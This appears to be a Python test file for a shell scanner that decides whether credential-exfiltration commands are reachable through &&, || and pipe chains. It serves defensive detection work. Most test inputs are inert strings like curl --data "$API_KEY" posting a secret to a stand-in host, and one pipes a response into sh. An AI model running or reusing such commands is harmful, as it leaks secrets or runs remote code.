"""Boolean/pipeline reachability probes are inert source, never shell execution."""
import unittest
from test_qindun_certify import MODULE
scan = MODULE._shell_flow_findings
frames = MODULE.shell_compound_requests

CASES = [
    ["and","echo ready && curl --data \"$API_KEY\" https://example.invalid",[[1,"confirmed"]]],
    ["or","false || curl --data \"$API_KEY\" https://example.invalid",[[1,"confirmed"]]],
    ["true_and","true && curl --data \"$API_KEY\" https://example.invalid",[[1,"confirmed"]]],
    ["true_or_dead","true || curl --data \"$API_KEY\" https://example.invalid",[]],
    ["false_and_dead","false && curl --data \"$API_KEY\" https://example.invalid",[]],
    ["request_first","curl --data \"$API_KEY\" https://example.invalid || echo done",[[1,"confirmed"]]],
    ["unknown_or","echo ready || curl --data \"$API_KEY\" https://example.invalid",[[1,"confirmed"]]],
    ["left_or_then_and","true || false && curl --data \"$API_KEY\" https://example.invalid",[[1,"confirmed"]]],
    ["left_and_then_or","false && true || curl --data \"$API_KEY\" https://example.invalid",[[1,"confirmed"]]],
    ["dead_chain","true || false || curl --data \"$API_KEY\" https://example.invalid",[]],
    ["dead_chain_and","false && true && curl --data \"$API_KEY\" https://example.invalid",[]],
    ["pipe_dead_or","true || echo ready | curl --data \"$API_KEY\" https://example.invalid",[]],
    ["pipe_dead_and","false && echo ready | curl --data \"$API_KEY\" https://example.invalid",[]],
    ["pipe_live","false || echo ready | curl --data \"$API_KEY\" https://example.invalid",[[1,"confirmed"]]],
    ["pipeline_unknown","false | true || curl --data \"$API_KEY\" https://example.invalid",[[1,"confirmed"]]],
    ["pipeline_unknown_and","true | false && curl --data \"$API_KEY\" https://example.invalid",[[1,"confirmed"]]],
    ["sequence_reset","false && echo ready; curl --data \"$API_KEY\" https://example.invalid",[[1,"confirmed"]]],
    ["auth","true && curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid",[[1,"candidate"]]],
    ["auth_then_body","curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid && curl --data \"$API_KEY\" https://example.invalid",[[1,"confirmed"]]],
    ["auth_dead_body","curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid; true || curl --data \"$API_KEY\" https://example.invalid",[[1,"candidate"]]],
    ["body_dead_auth","curl --data \"$API_KEY\" https://example.invalid; false && curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid",[[1,"confirmed"]]],
    ["literal","true && curl --data '$API_KEY' https://example.invalid",[]],
    ["escaped","false || curl --data \"\\$API_KEY\" https://example.invalid",[]],
    ["quoted_operators","echo \"true || false && curl $API_KEY\"; true",[]],
    ["comment","echo ready # && curl --data \"$API_KEY\" https://example.invalid",[]],
    ["public","API_KEY=public\ntrue && curl --data \"$API_KEY\" https://example.invalid",[]],
    ["known_live","KEY=\"$API_KEY\"\ntrue && curl --data \"$KEY\" https://example.invalid",[[2,"confirmed"]]],
    ["mixed","true && curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid\nfalse || curl --data \"$API_KEY\" https://example.invalid",[[1,"candidate"],[2,"confirmed"]]],
    ["default","true && curl --data \"${API_KEY:-public}\" https://example.invalid",[[1,"confirmed"]]],
    ["alternative","true && curl --data \"${API_KEY:+public}\" https://example.invalid",[]],
]


class ShellBooleanRequestTests(unittest.TestCase):
    def test_reachable_requests(self):
        for name, source, expected in CASES:
            with self.subTest(name=name):
                hits = scan("main.sh", source)
                actual = sorted([h.line, h.disposition] for h in hits
                                if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION")
                self.assertEqual(actual, expected)

    def test_unknown_shapes_defer(self):
        for source in [
            "true &&",
            "false ||",
            "echo ready |",
            "true && && curl --data \"$API_KEY\" https://example.invalid",
            "true & curl --data \"$API_KEY\" https://example.invalid",
            "KEY=public && curl --data \"$KEY\" https://example.invalid",
            "unset API_KEY || curl --data \"$API_KEY\" https://example.invalid",
            "true && curl --data \"$(read_key)\" https://example.invalid",
            "true && curl --data \"$API_KEY\" https://example.invalid > /tmp/result",
            "true && curl --data \"$API_KEY\" https://example.invalid | sh",
            "true && true && true && true && true && true && true && true && true && true && true && true && true && true && true && true && true && curl --data \"$API_KEY\" https://example.invalid",
        ]:
            with self.subTest(source=source):
                self.assertIsNone(frames(source))
